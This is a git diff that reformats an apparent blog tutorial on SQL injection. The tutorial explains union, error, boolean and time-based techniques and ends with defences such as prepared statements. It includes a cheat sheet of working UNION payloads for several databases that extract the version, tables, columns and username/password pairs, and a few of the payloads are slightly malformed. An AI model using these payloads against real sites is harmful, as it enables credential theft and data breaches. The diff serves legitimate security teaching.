@@ -17,33 +17,44 @@
 
     <img src="../images/snake_of_eden.png" style="max-width: 100%; border-radius: 8px;" height="200px"/>
 
-    <p>This week I&#39;ve been learning and experimenting with SQL injection (SQLi). An all too common vulnerability that allows attackers to make database queries and extract sensitive information quickly and efficiently, compromising everything from analytics to user credentials and personal information (a.k.a. GDPR nightmare). I will explain how SQLi injection works in theory, share a cheat sheet with working payloads you can try out (with permission of course) and discuss how to protect against SQLi.</p>
-<h1 id="how-sql-injection-works">How SQL Injection works</h1>
-<p>SQLi exploits unsafe programming where a user input is directly parsed into an SQL query in the backend. By escaping the input field arbitrary SQL queries can be injection to obtain sensitive information.</p>
-<p>An example of an unsafe query would be something like this:
-<code>SELECT * FROM products where category = &#39;USER_INPUT&#39;</code></p>
-<p>If user puts in <code>kitchen</code> as a category on the website the backend would query:
-<code>SELECT name, price FROM products where category = &#39;kitchen&#39;</code></p>
+    <p>This week I&#39;ve been learning and experimenting with SQL injection (SQLi). An all too common vulnerability that allows attackers to make database queries and extract 
+      sensitive information quickly and efficiently, compromising everything from analytics to user credentials and personal information (a.k.a. GDPR nightmare). I will explain 
+      how SQLi injection works in theory, share a cheat sheet with working payloads you can try out (with permission of course) and discuss how to protect against SQLi.</p>
+
+    <h1 id="how-sql-injection-works">How SQL Injection works</h1>
+
+    <p>SQLi exploits unsafe programming where a user input is directly parsed into an SQL query in the backend. By escaping the input field arbitrary SQL queries can be injection 
+      to obtain sensitive information.</p>
+    <p>An example of an unsafe query would be something like this:
+      <code>SELECT * FROM products where category = &#39;USER_INPUT&#39;</code></p>
+    <p>If user puts in <code>kitchen</code> as a category on the website the backend would query:
+      <code>SELECT name, price FROM products where category = &#39;kitchen&#39;</code></p>
 <p>If the input is vulnerable to SQL injection an attacker can instead input <code>kitchen&#39;UNION+SELECT+username,password+FROM+users--</code></p>
 <p>This works because it forms a valid SQL query like this:
-<code>SELECT name, price FROM products where category = &#39;kitchen&#39; UNION SELECT username, password FROM users--</code> (spaces have been added for clarity). The result will be a set of data that contains both the products from the kitchen category but additionally has the columns username and password from the users table appended.</p>
+<code>SELECT name, price FROM products where category = &#39;kitchen&#39; UNION SELECT username, password FROM users--</code> (spaces have been added for clarity). The result will 
+  be a set of data that contains both the products from the kitchen category but additionally has the columns username and password from the users table appended.</p>
 <p>The attacker has successfully performed an SQL injection attack and has compromised user credentials.</p>
+    
 <h1 id="types-of-sqli">Types of SQLi</h1>
-<p>The example shown above was a UNION based attack but their are 3 other important types of SQLi commonly used:</p>
 <h2 id="error-based">Error Based</h2>
 <p>Sometimes the web service returns the database error message when SQLi is performed. This helps to identify the backend query and therefore form better SQL injection payloads.</p>
 <h2 id="union-based">Union Based</h2>
 <p>By using the <code>UNION</code> command we can aggregate the results of two <code>SELECT</code> queries into a single result. This can be used to append a malicious query appending the extracted information to the real result.</p>
 <blockquote>
-<p>[!NOTE] Column number
-UNION based attacks require the malicious payload to return the same number of columns as the legit query. To find out how many columns are returned we can use context or use <code>&#39;ORDER BY x--</code> incrementing x by one each time until an error is encountered. If an error is encountered at x=4 we know that there are 3 columns.</p>
-<h2 id="blind-boolean-based">Blind // Boolean Based</h2>
-<p>Can be tested with something like <code>&#39; AND 1=1--</code>. This allows us to obtain database information using true or false conditions similar to time based attacks. For example finding the length of database with a query like this <code>&#39; AND (length(database())) = 1 --</code> can check if the database length is 1. Similar to time based attacks this is very slow because no actual data is returned, but it can be used to verify results.</p>
+<p>UNION based attacks require the malicious payload to return the same number of columns as the legit query. To find out how many columns are returned we can use context or use <code>&#39;
+  ORDER BY x--</code> incrementing x by one each time until an error is encountered. If an error is encountered at x=4 we know that there are 3 columns.</p>
 </blockquote>
+<h2 id="blind-boolean-based">Blind // Boolean Based</h2>
+<p>Can be tested with something like <code>&#39; AND 1=1--</code>. This allows us to obtain database information using true or false conditions similar to time based attacks. For example 
+  finding the length of database with a query like this <code>&#39; AND (length(database())) = 1 --</code> can check if the database length is 1. Similar to time based attacks this is very 
+  slow because no actual data is returned, but it can be used to verify results.</p>
+
 <h2 id="blind-time-based">Blind // Time Based</h2>
-<p>By forcing the database to wait before returning the value with <code>SLEEP(10)</code> we can figure out if the query result is TRUE or FALSE. Depending on the outcome, the response will either be delayed or returned immediately. No real data is returned, it can only be confirmed bit by bit if the result is True of False making attacks like these slow, especially with large databases.</p>
+<p>By forcing the database to wait before returning the value with <code>SLEEP(10)</code> we can figure out if the query result is TRUE or FALSE. Depending on the outcome, 
+  the response will either be delayed or returned immediately. No real data is returned, it can only be confirmed bit by bit if the result is True of False making attacks like these 
+  slow, especially with large databases.</p>
 <h1 id="cheat-sheet">Cheat sheet</h1>
-<h2 id="1-get-version-information">1. Get version information</h2>
+<h2 id="1-get-version-information">Get version information</h2>
 <table>
 <thead>
 <tr>
@@ -66,16 +77,17 @@ UNION based attacks require the malicious payload to return the same number of c
 </tr>
 </tbody>
 </table>
-<p>(assuming UNION expects two columns)
-Oracle
+<p>(assuming UNION expects two columns)</p>
+<p>Oracle</p>
 <code>&#39;UNION+SELECT+NULL,banner+FROM+v$version--</code>
-Microsoft
+<p>Microsoft</p>
 <code>&#39;UNION+SELECT+NULL,@@version--</code>
-PostgreSQL
+<p>PostgreSQL</p>
 <code>&#39;UNION+SELECT+NULL,version()--</code>
-MySQL
-<code>&#39;UNION+SELECT+NULL,@@version-- c</code></p>
-<h2 id="2-get-tables">2. Get Tables</h2>
+<p>MySQL</p>
+<code>&#39;UNION+SELECT+NULL,@@version-- c</code>
+
+<h2 id="2-get-tables">Get Tables</h2>
 <table>
 <thead>
 <tr>
@@ -98,16 +110,17 @@ MySQL
 </tr>
 </tbody>
 </table>
-<p>(assuming UNION expects two columns)
-Oracle
+<p>(assuming UNION expects two columns)</p>
+<p>Oracle</p>
 <code>&#39;UNION+SELECT+NULL,table_name+FROM+all_tables--</code>
-Microsoft
+<p>Microsoft</p>
 <code>&#39;UNION+SELECT+NULL,table_name+FROM+information_schema.tables--</code>
-PostgreSQL
+<p>PostgreSQL</p>
 <code>&#39;UNION+SELECT+NULL,table_name+FROM+information_schema.tables--</code>
-MySQL
-<code>`&#39;UNION+SELECT+NULL,table_name+FROM+information_schema.tables-- c</code></p>
-<h2 id="3-get-columns">3. Get columns</h2>
+<p>MySQL</p>
+<code>`&#39;UNION+SELECT+NULL,table_name+FROM+information_schema.tables-- c</code>
+
+<h2 id="3-get-columns">Get columns</h2>
 <table>
 <thead>
 <tr>
@@ -130,12 +143,16 @@ MySQL
 </tr>
 </tbody>
 </table>
-<p>(assuming UNION expects two columns)
-Oracle
+<p>(assuming UNION expects two columns)</p>
+<p>Oracle</p>
 <code>&#39;UNION+SELECT+NULL,all_tab_columns+WHERE+table_name=&#39;TABLE_NAME&#39;--</code></p>
-<p>Microsoft<code>&#39;UNION+SELECT+NULL,column_name+FROM+information_schema.columns+WHERE+table_name=&#39;TABLE_NAME&#39;--</code></p>
-<p>PostgreSQL<code>&#39;UNION+SELECT+NULL,column_name+FROM+information_schema.columns+WHERE+table_name=&#39;TABLE_NAME&#39;--</code></p>
-<p>MySQL<code>&#39;UNION+SELECT+NULL,column_name+FROM+information_schema.columns+WHERE+table_name=&#39;TABLE_NAME&#39;-- c</code></p>
+<p>Microsoft</p>
+<code>&#39;UNION+SELECT+NULL,column_name+FROM+information_schema.columns+WHERE+table_name=&#39;TABLE_NAME&#39;--</code>
+<p>PostgreSQL</p>
+<code>&#39;UNION+SELECT+NULL,column_name+FROM+information_schema.columns+WHERE+table_name=&#39;TABLE_NAME&#39;--</code>
+<p>MySQL</p>
+<code>&#39;UNION+SELECT+NULL,column_name+FROM+information_schema.columns+WHERE+table_name=&#39;TABLE_NAME&#39;-- c</code>
+
 <h2 id="string-concatenation">String concatenation</h2>
 <table>
 <thead>
@@ -213,7 +230,7 @@ for example <code>username || &#39;~&#39; || password</code> will retrieve usern
 <h1 id="how-to-protect-against-sqli">How to protect against SQLi</h1>
 <h2 id="prepared-statements">Prepared statements</h2>
 <p>The easiest and one of the safest solutions are prepared statements. Instead of directly inserting data into SQL queries we use a placeholder <code>?</code>. On execution the application binds the values to the parameters.</p>
-<h2 id="sanitation">Sanitation</h2>
+<h2 id="sanitation">Sanitization</h2>
 <p>Additionally, it is recommended to sanitise data and remove special characters (if not necessarily required) from the value, especially <code>&#39;</code>, <code>,</code> and <code>-</code>. Work on a zero-trust basis. Every character that doesn&#39;t need to be supported should be removed.</p>
 <h2 id="encrypt-hash-information">Encrypt / Hash information</h2>
 <p>Although this won&#39;t prevent SQLi injection, encrypting or hashing your database information makes it harder for attackers to use the extracted information. Instead of valid admin credentials or actual credit card information they&#39;ll be left with unidentifiable gibberish.</p>
